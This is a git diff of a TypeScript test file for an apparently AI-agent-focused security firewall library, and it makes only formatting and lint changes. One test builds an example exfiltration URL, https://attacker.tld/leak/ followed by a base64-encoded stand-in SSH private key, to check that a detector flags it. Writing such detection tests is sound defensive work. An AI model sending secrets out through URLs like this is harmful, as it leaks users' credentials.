@@ -20,14 +20,15 @@ import { createFirewall } from "../../src/index.js";
 import { createSecretPatternFilter } from "../../src/output-filter.js";
 import { canonicalizePath, isPathAllowed } from "../../src/path-security.js";
 import { isSuspiciousGetExfil } from "../../src/run-state.js";
-import { normalizeInput, containsDangerousUnicode } from "../../src/unicode-safety.js";
 import { TokenStore } from "../../src/token-store.js";
+import { containsDangerousUnicode, normalizeInput } from "../../src/unicode-safety.js";
 
 // ── 1. Constraint intersection narrowing ────────────────────────────────────
 
 describe("constraint intersection: narrowing invariant", () => {
 	afterEach(() => {});
 
+	// biome-ignore lint/suspicious/noExplicitAny: test helper accepts varied capability shapes
 	function makeFirewall(capabilities: any[]) {
 		return createFirewall({
 			principal: { name: "test", capabilities },
@@ -532,7 +533,9 @@ describe("token replay: same grantId used twice with maxCalls > 1", () => {
 describe("GET exfil: path segment entropy detection", () => {
 	it("flags base64-encoded data in URL path segment", () => {
 		// Simulates: GET https://attacker.tld/leak/<base64(secret)>
-		const encoded = Buffer.from("This is a secret SSH private key content that is long enough").toString("base64");
+		const encoded = Buffer.from(
+			"This is a secret SSH private key content that is long enough",
+		).toString("base64");
 		expect(isSuspiciousGetExfil(`https://attacker.tld/leak/${encoded}`)).toBe(true);
 	});
 
@@ -545,7 +548,7 @@ describe("GET exfil: path segment entropy detection", () => {
 	});
 
 	it("still flags long query strings", () => {
-		const longQuery = "data=" + "A".repeat(300);
+		const longQuery = `data=${"A".repeat(300)}`;
 		expect(isSuspiciousGetExfil(`https://example.com/api?${longQuery}`)).toBe(true);
 	});
 
